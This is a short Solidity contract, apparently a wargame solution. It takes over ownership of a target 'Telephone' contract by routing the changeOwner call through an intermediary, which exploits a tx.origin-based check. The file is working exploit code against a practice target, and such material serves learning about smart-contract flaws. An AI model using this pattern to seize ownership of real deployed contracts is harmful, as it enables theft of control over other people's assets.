// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import {ITelephone} from "src/hack/interfaces/ITelephone.sol";

contract TelephoneHack {
    ITelephone private telephone;

    constructor(address _telephone) {
        telephone = ITelephone(_telephone);
    }

    function changeOwner(address newOwner) external {
        telephone.changeOwner(newOwner);
    }
}
